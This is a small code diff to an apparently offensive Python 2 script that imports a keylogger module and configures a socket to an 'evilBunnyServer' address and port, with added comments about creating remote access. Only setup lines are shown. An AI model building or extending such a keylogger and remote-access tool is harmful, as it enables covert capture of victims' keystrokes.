@@ -1,3 +1,4 @@
+#!/usr/bin/env python2
 
 import keylogger
 import time
@@ -6,8 +7,8 @@ from thread import *
 
 ############################################################################
 
-evilBunnyServerIP   = "127.0.0.1"
-evilBunnyServerPort = 8912
+evilBunnyServerIP   = "127.0.0.1"                           # Server connects to itself, create remote access
+evilBunnyServerPort = 8912                                  # Port will most likely be blocked, fix this
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 ############################################################################
